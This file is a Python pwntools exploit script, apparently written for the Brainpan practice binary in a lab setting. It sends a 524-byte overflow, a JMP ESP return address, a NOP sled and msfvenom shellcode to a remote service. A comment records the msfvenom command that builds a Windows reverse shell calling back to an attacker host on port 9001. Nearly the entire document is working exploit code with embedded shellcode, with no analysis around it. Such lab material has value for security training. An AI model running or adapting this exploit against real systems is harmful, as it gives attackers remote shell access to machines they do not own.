from pwn import *
import struct

def exploit(ip , port):
    connection = remote(ip , port) #Opening a connection
    connection.recvuntil("_|                            _|                                        \n_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  \n_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|\n_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|\n_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|\n                                            _|                          \n                                            _|\n\n[________________________ WELCOME TO BRAINPAN _________________________]\n                          ENTER THE PASSWORD                              \n\n                          >> ")#Waiting for this value.It will wait untill this response comes from the port
    print("\nSending Payload\n")
    offset = 524
    junk = b"A" * offset
    retn = struct.pack("I" , 0x311712f3) # Now for this one which is a jump point  | ctrl + f [search JMP ESP]
    buf =  "" #metasploit exploit made using msfvenom | msfvenom -p windows/shell_reverse_tcp LHOST=10.8.26.35 LPORT=9001 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f py 
    padding = b"\x90" * 16 #Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes but we have to check manually which one will work
    buf =  b""
    buf += b"\xd9\xea\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1\x52\xbf\x27"  
    buf += b"\xa7\x6a\xfa\x31\x7b\x17\x03\x7b\x17\x83\xcc\x5b\x88"
    buf += b"\x0f\xee\x4c\xcf\xf0\x0e\x8d\xb0\x79\xeb\xbc\xf0\x1e"
    buf += b"\x78\xee\xc0\x55\x2c\x03\xaa\x38\xc4\x90\xde\x94\xeb"
    buf += b"\x11\x54\xc3\xc2\xa2\xc5\x37\x45\x21\x14\x64\xa5\x18"
    buf += b"\xd7\x79\xa4\x5d\x0a\x73\xf4\x36\x40\x26\xe8\x33\x1c"
    buf += b"\xfb\x83\x08\xb0\x7b\x70\xd8\xb3\xaa\x27\x52\xea\x6c"
    buf += b"\xc6\xb7\x86\x24\xd0\xd4\xa3\xff\x6b\x2e\x5f\xfe\xbd"
    buf += b"\x7e\xa0\xad\x80\x4e\x53\xaf\xc5\x69\x8c\xda\x3f\x8a"
    buf += b"\x31\xdd\x84\xf0\xed\x68\x1e\x52\x65\xca\xfa\x62\xaa"
    buf += b"\x8d\x89\x69\x07\xd9\xd5\x6d\x96\x0e\x6e\x89\x13\xb1"
    buf += b"\xa0\x1b\x67\x96\x64\x47\x33\xb7\x3d\x2d\x92\xc8\x5d"
    buf += b"\x8e\x4b\x6d\x16\x23\x9f\x1c\x75\x2c\x6c\x2d\x85\xac"
    buf += b"\xfa\x26\xf6\x9e\xa5\x9c\x90\x92\x2e\x3b\x67\xd4\x04"
    buf += b"\xfb\xf7\x2b\xa7\xfc\xde\xef\xf3\xac\x48\xd9\x7b\x27"
    buf += b"\x88\xe6\xa9\xe8\xd8\x48\x02\x49\x88\x28\xf2\x21\xc2"
    buf += b"\xa6\x2d\x51\xed\x6c\x46\xf8\x14\xe7\x63\xf5\x0c\xd4"
    buf += b"\x1b\x07\x30\x39\xf5\x8e\xd6\x57\x15\xc7\x41\xc0\x8c"
    buf += b"\x42\x19\x71\x50\x59\x64\xb1\xda\x6e\x99\x7c\x2b\x1a"
    buf += b"\x89\xe9\xdb\x51\xf3\xbc\xe4\x4f\x9b\x23\x76\x14\x5b"
    buf += b"\x2d\x6b\x83\x0c\x7a\x5d\xda\xd8\x96\xc4\x74\xfe\x6a"
    buf += b"\x90\xbf\xba\xb0\x61\x41\x43\x34\xdd\x65\x53\x80\xde"
    buf += b"\x21\x07\x5c\x89\xff\xf1\x1a\x63\x4e\xab\xf4\xd8\x18"
    buf += b"\x3b\x80\x12\x9b\x3d\x8d\x7e\x6d\xa1\x3c\xd7\x28\xde"
    buf += b"\xf1\xbf\xbc\xa7\xef\x5f\x42\x72\xb4\x40\xa1\x56\xc1"
    buf += b"\xe8\x7c\x33\x68\x75\x7f\xee\xaf\x80\xfc\x1a\x50\x77"
    buf += b"\x1c\x6f\x55\x33\x9a\x9c\x27\x2c\x4f\xa2\x94\x4d\x5a"


    connection.send(junk + retn + padding + buf + b"\n") #sending the payload
    connection.close() 
exploit("10.10.245.217" , "9999")